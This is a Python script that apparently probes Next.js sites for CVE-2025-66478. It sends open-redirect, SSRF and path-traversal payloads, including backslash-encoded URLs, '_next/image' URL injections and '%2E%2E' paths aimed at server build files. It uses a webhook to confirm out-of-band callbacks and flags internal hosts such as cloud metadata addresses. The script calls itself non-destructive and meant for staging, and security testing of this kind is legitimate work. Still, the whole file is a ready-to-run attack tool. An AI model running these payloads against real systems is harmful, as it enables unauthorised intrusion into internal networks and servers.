#!/usr/bin/env python3
# next15_cve66478_amplify.py
# Advanced, non-destructive amplifier for CVE-2025-66478 testing.
# Usage: edit TARGET and PROVE_URL, then run: python3 next15_cve66478_amplify.py

import requests, json, time, urllib.parse, sys, re
from collections import defaultdict

# ===== CONFIG =====
TARGET = "https://demo.djangocfg.com"   # target under your control
PROVE_URL = "https://en8q-xxxxxx.webhook.site/unique-id"  # webhook you control
FOLLOW_REDIRECTS = False   # we handle redirects manually to inspect Location header
MAX_REDIRECTS = 6
SLEEP_BETWEEN = 0.35
OUTFILE = "amplify_results.json"
HEADERS = {"User-Agent": "CVE-2025-66478-Amplifier/1.0"}
# ==================

# Detection helpers
internal_indicators = [
    "127.0.0.1", "localhost", "169.254.169.254", "10.", "192.168.", "172.16.", ".next/server", PROVE_URL
]

def find_indicator(text):
    for ind in internal_indicators:
        if ind in text:
            return ind
    return None

# payload generation (various encodings and vectors)
def gen_payloads(prove):
    p = urllib.parse.urlparse(prove)
    prove_str = prove
    prove_host = prove.replace("https://","").replace("http://","")
    enc = lambda s: urllib.parse.quote(s, safe='')
    double = lambda s: urllib.parse.quote(enc(s), safe='')

    payloads = {
        "backslash_double_localhost": "/%5C%5Clocalhost:3000",
        "backslash_127": "/%5Chttp://127.0.0.1:3000",
        "double_slash_localhost": "//http://localhost:3000",
        # direct to prove
        "proto_backslash_prove": "/%5C" + prove_str,
        "proto_backslash_double_prove": "/%5C%5C" + prove_str,
        "proto_double_slash_prove": "//" + prove_str,
        # encoded variations
        "proto_pct_encoded": "/" + enc("\\http://") + prove_host,
        "proto_double_pct": "/" + enc("\\\\http://") + prove_host,
        "double_encoded_prove": "/" + double("\\") + prove_str,
        # image optimizer variations
        "image_raw": "/_next/image?url=" + urllib.parse.quote("\\\\" + prove_str) + "&w=64&q=75",
        "image_double": "/_next/image?url=" + urllib.parse.quote("//" + prove_str) + "&w=64&q=75",
        # rsc / action triggers
        "rsc_probe": "/%5C" + prove_host + "?_rsc=1",
        "action_probe": "/%5C" + prove_host + "?__NEXT_ACTION__=1",
        # next/data and static patterns
        "next_data_traversal": "/_next/data/dev/app/%2E%2E/%2E%2E/server/app/page.js",
        "next_static_traversal": "/_next/static/%2E%2E/%2E%2E/server/app/layout.js",
        # redirect param injection
        "login_next_param": "/login?next=%5C%5C" + urllib.parse.quote(prove_str),
        # rare chains
        "rare_chain": "/%5C/%5C/" + prove_str,
    }
    # add variant with query tag for correlation
    return payloads

def send_no_follow(path):
    url = TARGET + path
    try:
        r = requests.get(url, headers=HEADERS, timeout=8, allow_redirects=False)
        return r
    except Exception as e:
        return e

def walk_redirects(initial_response):
    chain = []
    r = initial_response
    hops = 0
    while True:
        if not hasattr(r, "headers"):
            chain.append({"error": str(r)})
            break
        loc = r.headers.get("location")
        chain.append({"status": r.status_code, "location": loc, "snippet": (r.text[:200] if r.text else "")})
        if not loc or hops >= MAX_REDIRECTS:
            break
        # follow relative redirects by requesting the new location on same host if needed
        # If location starts with '/', build full target URL
        if loc.startswith("/"):
            next_url = urllib.parse.urljoin(TARGET, loc)
        else:
            # some servers return encoded forms like '/%5Chttps:/...'
            next_url = urllib.parse.urljoin(TARGET, loc)
        try:
            r = requests.get(next_url, headers=HEADERS, timeout=8, allow_redirects=False)
        except Exception as e:
            chain.append({"error": str(e)})
            break
        hops += 1
    return chain

def analyze_chain(chain):
    text_combined = json.dumps(chain)
    ind = find_indicator(text_combined)
    return ind

def main():
    payloads = gen_payloads(PROVE_URL)
    results = {}
    print("Starting amplify scan against", TARGET)
    for name, path in payloads.items():
        time.sleep(SLEEP_BETWEEN)
        # attach small tag param so webhook logs can correlate (if PROVE_URL supports query)
        tag = f"?amp={int(time.time())}"
        full_path = path + tag if "?" not in path else path + "&amp=" + str(int(time.time()))
        print("\n▶", name, "->", full_path)
        r = send_no_follow(full_path)
        if isinstance(r, Exception):
            print("  ERROR:", r)
            results[name] = {"error": str(r)}
            continue

        chain = walk_redirects(r)
        indicator = analyze_chain(chain)
        results[name] = {"initial_status": r.status_code, "chain": chain, "indicator": indicator}
        print("  initial:", r.status_code, " indicator:", indicator)
    # save results
    with open(OUTFILE, "w") as f:
        json.dump({"target": TARGET, "prove": PROVE_URL, "results": results}, f, indent=2)
    print("\nScan complete. Results saved to", OUTFILE)
    # summary
    print("\nSummary (indicators found):")
    for k,v in results.items():
        print(f"{k:30} -> {v.get('indicator')}")
    print("\nNow check your PROVE_URL logs + your server logs for any incoming requests containing the amp tag.")
    print("If any indicator is non-null (e.g. 'localhost' or your PROVE_URL) — you have escalatable SSRF.")
    print("Run this in staging and limit traffic; do NOT run aggressive tests on third-party sites.")
if __name__ == '__main__':
    main()
